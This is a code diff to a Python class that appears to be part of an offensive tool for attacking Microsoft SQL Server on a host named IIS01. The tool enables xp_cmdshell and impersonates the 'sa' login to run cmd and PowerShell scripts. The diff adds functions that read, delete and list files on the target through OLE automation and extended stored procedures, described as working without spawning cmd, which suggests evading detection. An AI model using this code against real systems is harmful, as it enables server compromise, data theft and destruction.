@@ -34,7 +34,7 @@ class XpMssqlBase:
     def _exec_q(self, shell, tsql: str, timeout_s: int = None) -> str:
         """Send one sqlcmd -Q task. Escapes " for C runtime -Q "..." boundary only."""
         if getattr(shell, 'debug', False):
-            print(f"[DBG] TSQL  → {tsql}")
+            print(f"[DBG] TSQL  : {tsql}")
         cmd = f'{self._sqlcmd_prefix()} -Q "{tsql.replace(chr(34), chr(34)*2)}"'
         return shell.cmd_exec_raw(cmd, timeout_s=timeout_s)
 
@@ -70,8 +70,13 @@ class XpMssqlBase:
             "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"
         )
         self._exec_q(shell, setup)
-        out = self._exec_q(shell, "EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'whoami'")
-        print(f"[+] xpinit OK — context: {out.strip()}")
+        out = self._exec_q(shell,
+            "EXECUTE AS LOGIN='sa';"
+            "SELECT @@SERVERNAME AS [server],"
+            "(SELECT TOP 1 service_account FROM sys.dm_server_services "
+            "WHERE servicename LIKE N'SQL Server%') AS [svc_account];"
+        )
+        print(f"[+] xpinit OK — {out.strip()}")
 
     def cmd_xpshell_cmd(self, shell, cmd: str):
         """Run a cmd.exe command on IIS01 via .bat staging; capture output."""
@@ -87,7 +92,7 @@ class XpMssqlBase:
         """Stage and run a PowerShell script on IIS01; stdout captured by xp_cmdshell."""
         if getattr(shell, 'debug', False):
             preview = script[:400] + ('…' if len(script) > 400 else '')
-            print(f"[DBG] PSH   → {preview}")
+            print(f"[DBG] PSH   : {preview}")
         ps1 = self._rand_tmp("ps1")
         self._sp_oa_write(shell, ps1, script)
         run_tsql = (
@@ -97,3 +102,52 @@ class XpMssqlBase:
         output = self._exec_q(shell, run_tsql, timeout_s=timeout_s)
         self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'del /f {self._tsql_escape(ps1)}'")
         print(output)
+
+    # ── file operations (no cmd spawn on IIS01) ────────────────────────────
+
+    def cmd_xpfile_exists(self, shell, path: str):
+        """Check file/directory existence on IIS01 via xp_fileexist (no cmd spawn)."""
+        out = self._exec_q(shell,
+            "EXECUTE AS LOGIN='sa';"
+            f"EXEC master.dbo.xp_fileexist '{self._tsql_escape(path)}';"
+        )
+        print(out)
+
+    def cmd_xpfile_del(self, shell, path: str):
+        """Delete file on IIS01 via sp_OA FileSystemObject (no cmd spawn)."""
+        out = self._exec_q(shell,
+            "EXECUTE AS LOGIN='sa';"
+            "DECLARE @fso INT,@hr INT;"
+            "EXEC sp_OACreate 'Scripting.FileSystemObject',@fso OUT;"
+            f"EXEC @hr=sp_OAMethod @fso,'DeleteFile',NULL,"
+            f"'{self._tsql_escape(path)}';"
+            "SELECT CASE @hr WHEN 0 THEN 'deleted' "
+            "ELSE 'error: hr='+CAST(@hr AS VARCHAR(20)) END AS result;"
+            "EXEC sp_OADestroy @fso;"
+        )
+        print(out)
+
+    def cmd_xpfile_cat(self, shell, path: str):
+        """Read text file on IIS01 via sp_OA ADODB.Stream (no cmd spawn)."""
+        out = self._exec_q(shell,
+            "EXECUTE AS LOGIN='sa';"
+            "DECLARE @s INT,@text NVARCHAR(MAX);"
+            "EXEC sp_OACreate 'ADODB.Stream',@s OUT;"
+            "EXEC sp_OASetProperty @s,'Type',2;"
+            "EXEC sp_OAMethod @s,'Open';"
+            f"EXEC sp_OAMethod @s,'LoadFromFile',NULL,"
+            f"'{self._tsql_escape(path)}';"
+            "EXEC sp_OAGetProperty @s,'ReadText',@text OUT;"
+            "SELECT @text AS content;"
+            "EXEC sp_OAMethod @s,'Close';"
+            "EXEC sp_OADestroy @s;"
+        )
+        print(out)
+
+    def cmd_xpfile_ls(self, shell, path: str):
+        """List directory on IIS01 via xp_dirtree (no cmd spawn)."""
+        out = self._exec_q(shell,
+            "EXECUTE AS LOGIN='sa';"
+            f"EXEC master.dbo.xp_dirtree '{self._tsql_escape(path)}',1,1;"
+        )
+        print(out)
